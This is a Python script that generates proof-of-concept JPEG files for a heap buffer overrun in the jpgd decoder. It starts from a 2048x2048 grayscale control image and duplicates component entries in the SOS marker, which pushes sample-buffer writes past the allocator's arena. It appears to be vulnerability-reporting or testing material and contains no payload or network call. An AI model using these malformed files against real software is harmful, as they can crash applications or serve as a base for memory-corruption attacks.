#!/usr/bin/env python3
"""Large grayscale SOS-duplicate PoCs: jpgd::alloc() is a bump allocator,
so a 16x16 image's overrun stays inside its 32512-byte arena. A 2048x2048
frame pushes the m_pSample_buf writes past the arena end, where ASan sees them.
Everything after SOI/SOS is produced by PIL and verified by make_poc.py's parser.
"""
from __future__ import annotations

import hashlib
import io
from pathlib import Path

from PIL import Image

from make_poc import check_frame, make_variant, parse_jpeg, verify

HERE = Path(__file__).resolve().parent
SIZE = 2048


def control_bytes() -> bytes:
    img = Image.new("L", (SIZE, SIZE))
    img.putdata([(x * 7 + y * 3) & 0xFF for y in range(SIZE) for x in range(SIZE)])
    out = io.BytesIO()
    img.save(out, format="JPEG", quality=75, progressive=False, optimize=False)
    return out.getvalue()


def main() -> None:
    control = control_bytes()
    ci = parse_jpeg(control)
    check_frame(ci)
    files = [("control_large.jpg", control, 1)]
    for n in (4,):
        files.append((f"dup{n}_large.jpg", make_variant(control, n), n))
    for name, data, ns in files:
        row = verify(control, ci, name, data, ns)
        (HERE / name).write_bytes(data)
        print(f"{name}: {row['size']} bytes sha256={row['sha256']} "
              f"Ns={row['ns']} SOS={row['sos_hex']} tail_identical={row['tail_identical']}")


if __name__ == "__main__":
    main()
